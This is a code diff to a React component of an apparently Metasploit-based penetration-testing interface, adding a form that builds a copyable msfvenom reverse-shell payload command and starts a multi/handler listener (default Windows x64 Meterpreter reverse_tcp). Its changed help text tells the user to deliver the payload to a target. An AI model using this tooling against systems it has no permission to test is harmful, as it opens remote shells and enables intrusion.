@@ -4233,6 +4233,14 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
   // MSF sessions (Shells tab) state
   const [msfSessions, setMsfSessions]               = useState<MsfSession[]>([]);
   const [msfSessionsLoading, setMsfSessionsLoading] = useState(false);
+
+  // Create listener form state
+  const [listenerOpen, setListenerOpen]         = useState(false);
+  const [listenerPayload, setListenerPayload]   = useState('windows/x64/meterpreter/reverse_tcp');
+  const [listenerLhost, setListenerLhost]       = useState('');
+  const [listenerLport, setListenerLport]       = useState('4444');
+  const [listenerLoading, setListenerLoading]   = useState(false);
+  const [listenerStatus, setListenerStatus]     = useState('');
   const msfLoadingRef = useRef(false); // synchronous guard against double-fire
   const upgradingRef = useRef<Set<string>>(new Set());
   // Tracks which MSF session is currently entered interactively (sessions -i <id>).
@@ -5222,6 +5230,130 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
                   </button>
                 </div>
               </div>
+
+              {/* ── Create Listener ── */}
+              <div className="create-listener-section">
+                <button
+                  className="create-listener-toggle"
+                  onClick={() => { setListenerOpen(o => !o); setListenerStatus(''); }}
+                >
+                  {listenerOpen ? '▾' : '▸'} Create Shell Listener
+                </button>
+                {listenerOpen && (
+                  <div className="create-listener-form">
+                    <div className="listener-form-row">
+                      <label>Payload</label>
+                      <select
+                        value={listenerPayload}
+                        onChange={e => setListenerPayload(e.target.value)}
+                        className="listener-select"
+                      >
+                        {MSFVENOM_PAYLOADS.map(g => (
+                          <optgroup key={g.group} label={g.group}>
+                            {g.payloads.map(p => (
+                              <option key={p} value={p}>{p}</option>
+                            ))}
+                          </optgroup>
+                        ))}
+                      </select>
+                    </div>
+                    <div className="listener-form-row">
+                      <label>LHOST</label>
+                      <input
+                        type="text"
+                        className="listener-input"
+                        placeholder="e.g. 192.168.1.10"
+                        value={listenerLhost}
+                        onChange={e => setListenerLhost(e.target.value)}
+                      />
+                      {localIfaces.length > 0 && (
+                        <select
+                          className="listener-iface-select"
+                          value=""
+                          onChange={e => { if (e.target.value) setListenerLhost(e.target.value); }}
+                        >
+                          <option value="">pick iface…</option>
+                          {localIfaces.map(i => (
+                            <option key={i.name} value={i.ip}>{i.name} ({i.ip})</option>
+                          ))}
+                        </select>
+                      )}
+                    </div>
+                    <div className="listener-form-row">
+                      <label>LPORT</label>
+                      <input
+                        type="text"
+                        className="listener-input listener-input-short"
+                        placeholder="4444"
+                        value={listenerLport}
+                        onChange={e => setListenerLport(e.target.value)}
+                      />
+                    </div>
+                    {listenerLhost && listenerLport && (
+                      <div className="listener-msfvenom-hint">
+                        <span className="listener-hint-label">msfvenom command:</span>
+                        <code className="listener-hint-code">
+                          {`msfvenom -p ${listenerPayload} LHOST=${listenerLhost} LPORT=${listenerLport} -f ${
+                            listenerPayload.startsWith('windows/') ? 'exe' :
+                            listenerPayload.startsWith('linux/')   ? 'elf' :
+                            listenerPayload.startsWith('php/')     ? 'raw' :
+                            listenerPayload.startsWith('python/')  ? 'py'  :
+                            listenerPayload.startsWith('android/') ? 'apk' :
+                            listenerPayload.startsWith('java/')    ? 'jar' : 'raw'
+                          } -o payload`}
+                        </code>
+                        <button
+                          className="btn-copy-small"
+                          title="Copy to clipboard"
+                          onClick={() => navigator.clipboard.writeText(
+                            `msfvenom -p ${listenerPayload} LHOST=${listenerLhost} LPORT=${listenerLport} -f ${
+                              listenerPayload.startsWith('windows/') ? 'exe' :
+                              listenerPayload.startsWith('linux/')   ? 'elf' :
+                              listenerPayload.startsWith('php/')     ? 'raw' :
+                              listenerPayload.startsWith('python/')  ? 'py'  :
+                              listenerPayload.startsWith('android/') ? 'apk' :
+                              listenerPayload.startsWith('java/')    ? 'jar' : 'raw'
+                            } -o payload`
+                          )}
+                        >⎘</button>
+                      </div>
+                    )}
+                    <div className="listener-form-actions">
+                      <button
+                        className="btn-run-scan"
+                        disabled={listenerLoading || !listenerLhost || !listenerLport}
+                        onClick={async () => {
+                          setListenerLoading(true);
+                          setListenerStatus('');
+                          try {
+                            await ensureMsfPrompt();
+                            await sendShellCmd('use exploit/multi/handler');
+                            await sendShellCmd(`set PAYLOAD ${listenerPayload}`);
+                            await sendShellCmd(`set LHOST ${listenerLhost}`);
+                            await sendShellCmd(`set LPORT ${listenerLport}`);
+                            await sendShellCmd('run -j');
+                            setListenerStatus('Listener started — waiting for incoming connection…');
+                            await new Promise(r => setTimeout(r, 1500));
+                            await loadMsfSessions();
+                          } catch {
+                            setListenerStatus('Failed to start listener. Is the Console open?');
+                          } finally {
+                            setListenerLoading(false);
+                          }
+                        }}
+                      >
+                        {listenerLoading ? <><span className="btn-spinner" /> Starting…</> : 'Start Listener'}
+                      </button>
+                    </div>
+                    {listenerStatus && (
+                      <p className={`listener-status ${listenerStatus.startsWith('Failed') ? 'listener-status-error' : ''}`}>
+                        {listenerStatus}
+                      </p>
+                    )}
+                  </div>
+                )}
+              </div>
+
               <div className="msf-sessions-body">
                 {msfSessionsLoading && hostSessions.length === 0 && (
                   <p className="output-hint">Loading sessions…</p>
@@ -5229,7 +5361,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
                 {!msfSessionsLoading && hostSessions.length === 0 && (
                   <p className="output-hint">
                     No active MSF sessions for {targetIP || 'this host'}.{'\n'}
-                    Run a module from Enumeration or CVE Analysis to create a session.{'\n'}
+                    Use "Create Shell Listener" above and deliver a payload to the target.{'\n'}
                     The Console tab must be open first.
                   </p>
                 )}
